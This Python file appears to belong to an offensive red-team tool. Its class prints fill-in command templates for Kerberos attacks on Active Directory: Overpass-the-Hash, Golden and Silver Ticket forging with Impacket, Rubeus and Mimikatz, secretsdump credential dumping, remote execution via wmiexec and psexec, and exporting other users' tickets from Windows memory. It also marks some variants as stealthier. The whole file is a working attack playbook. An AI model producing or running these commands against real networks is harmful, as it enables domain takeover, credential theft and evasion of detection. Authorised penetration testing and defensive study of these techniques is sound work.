"""
Command Reference — Prints alternative attack commands and
Windows ticket export/conversion guidance for operators.
"""


class CommandReference:
    """Static command reference printer for ticket-based attacks."""

    @staticmethod
    def print_opth_alternatives(
        domain: str, dc_ip: str, username: str,
        ntlm_hash: str = "", aes256_key: str = "",
    ):
        """Print alternative Overpass-the-Hash commands."""
        print(f"""
╔══════════════════════════════════════════════════════════════╗
║           OVERPASS-THE-HASH ALTERNATIVES                     ║
╚══════════════════════════════════════════════════════════════╝

[From Linux — Impacket]

  # With NTLM hash
  getTGT.py {domain}/{username} -hashes :{ntlm_hash or '<NTLM_HASH>'} -dc-ip {dc_ip}
  export KRB5CCNAME={username}.ccache

  # With AES256 key (stealthier — no RC4)
  getTGT.py {domain}/{username} -aesKey {aes256_key or '<AES256_KEY>'} -dc-ip {dc_ip}
  export KRB5CCNAME={username}.ccache

  # Then use Kerberos auth with any Impacket tool
  wmiexec.py {domain}/{username}@<target> -k -no-pass
  psexec.py {domain}/{username}@<target> -k -no-pass
  secretsdump.py {domain}/{username}@{dc_ip} -k -no-pass

[From Linux — CrackMapExec]

  export KRB5CCNAME={username}.ccache
  crackmapexec smb <target> -d {domain} -u {username} -k

[From Windows — Rubeus]

  # Request TGT with hash
  Rubeus.exe asktgt /user:{username} /rc4:{ntlm_hash or '<NTLM_HASH>'} /ptt
  Rubeus.exe asktgt /user:{username} /aes256:{aes256_key or '<AES256_KEY>'} /ptt

  # /ptt = Pass-the-Ticket (inject directly into memory)
  # /createnetonly = Create sacrificial process with ticket

[From Windows — Mimikatz]

  # Overpass-the-Hash
  sekurlsa::pth /user:{username} /domain:{domain} /ntlm:{ntlm_hash or '<NTLM_HASH>'} /run:cmd.exe

  # This spawns a new cmd.exe with the injected ticket
  # All Kerberos operations from that shell use the forged identity
""")

    @staticmethod
    def print_golden_alternatives(
        domain: str, dc_ip: str, domain_sid: str,
        username: str, user_id: int, krbtgt_hash: str,
        krbtgt_aes256: str = "", groups: str = "512,513,518,519,520",
    ):
        """Print alternative Golden Ticket commands."""
        print(f"""
╔══════════════════════════════════════════════════════════════╗
║              GOLDEN TICKET ALTERNATIVES                      ║
╚══════════════════════════════════════════════════════════════╝

[Impacket — ticketer.py]

  # With NTLM hash
  ticketer.py -nthash {krbtgt_hash} \\
    -domain-sid {domain_sid} \\
    -domain {domain} \\
    -user-id {user_id} \\
    -groups {groups} \\
    {username}

  export KRB5CCNAME={username}.ccache
  wmiexec.py {domain}/{username}@{dc_ip} -k -no-pass

  # With AES256 (stealthier)
  ticketer.py -aesKey {krbtgt_aes256 or '<AES256_KEY>'} \\
    -domain-sid {domain_sid} \\
    -domain {domain} \\
    {username}

[Mimikatz — Golden Ticket]

  kerberos::golden /user:{username} /domain:{domain} \\
    /sid:{domain_sid} /krbtgt:{krbtgt_hash} \\
    /id:{user_id} /groups:{groups} \\
    /ptt

  # /ptt injects directly into memory
  # /ticket:golden.kirbi saves to file instead

[Rubeus — Golden Ticket]

  Rubeus.exe golden /user:{username} /domain:{domain} \\
    /sid:{domain_sid} /rc4:{krbtgt_hash} \\
    /id:{user_id} /groups:{groups} \\
    /ptt

  # With AES256
  Rubeus.exe golden /user:{username} /domain:{domain} \\
    /sid:{domain_sid} /aes256:{krbtgt_aes256 or '<AES256>'} \\
    /ptt
""")

    @staticmethod
    def print_silver_alternatives(
        domain: str, domain_sid: str, username: str,
        service_hash: str, spn: str, user_id: int,
        service_aes256: str = "",
    ):
        """Print alternative Silver Ticket commands."""
        target_part = spn.split("/")[1] if "/" in spn else "TARGET"
        service_part = spn.split("/")[0] if "/" in spn else spn

        print(f"""
[Mimikatz — Silver Ticket]

  kerberos::golden /user:{username} /domain:{domain} \\
    /sid:{domain_sid} /rc4:{service_hash} \\
    /target:{target_part} \\
    /service:{service_part} \\
    /id:{user_id} /ptt

[Rubeus — Silver Ticket]

  Rubeus.exe silver /user:{username} /domain:{domain} \\
    /sid:{domain_sid} /rc4:{service_hash} \\
    /service:{spn} /ptt
""")

    @staticmethod
    def print_export_guidance(domain: str):
        """Print Windows ticket export and format conversion commands."""
        print(f"""
╔══════════════════════════════════════════════════════════════╗
║         EXPORTING TICKETS FROM WINDOWS MEMORY                ║
╚══════════════════════════════════════════════════════════════╝

[Rubeus — Export all tickets from current session]

  Rubeus.exe triage                          # List all cached tickets
  Rubeus.exe dump                            # Dump all tickets (base64)
  Rubeus.exe dump /luid:0x12345 /service:krbtgt  # Dump specific TGT
  Rubeus.exe dump /nowrap                    # One-line base64 (for copy/paste)

[Rubeus — Export from other sessions (requires admin)]

  Rubeus.exe triage                          # Find interesting sessions
  Rubeus.exe dump /luid:0x3e4 /nowrap        # Dump DA's TGT from LUID

[Mimikatz — Export tickets]

  # List tickets in memory
  sekurlsa::tickets /export

  # This creates .kirbi files for each ticket
  # Convert .kirbi to .ccache for Linux use:
  ticketConverter.py ticket.kirbi ticket.ccache

[Converting between formats]

  # .kirbi (Windows) → .ccache (Linux)
  ticketConverter.py admin.kirbi admin.ccache

  # .ccache (Linux) → .kirbi (Windows)
  ticketConverter.py admin.ccache admin.kirbi

  # Base64 (Rubeus output) → .kirbi
  echo "<base64>" | base64 -d > ticket.kirbi
  ticketConverter.py ticket.kirbi ticket.ccache

[Using exported tickets]

  # Linux
  export KRB5CCNAME=admin.ccache
  wmiexec.py {domain}/admin@target -k -no-pass

  # Windows (Rubeus)
  Rubeus.exe ptt /ticket:<base64_ticket>
  Rubeus.exe ptt /ticket:admin.kirbi
""")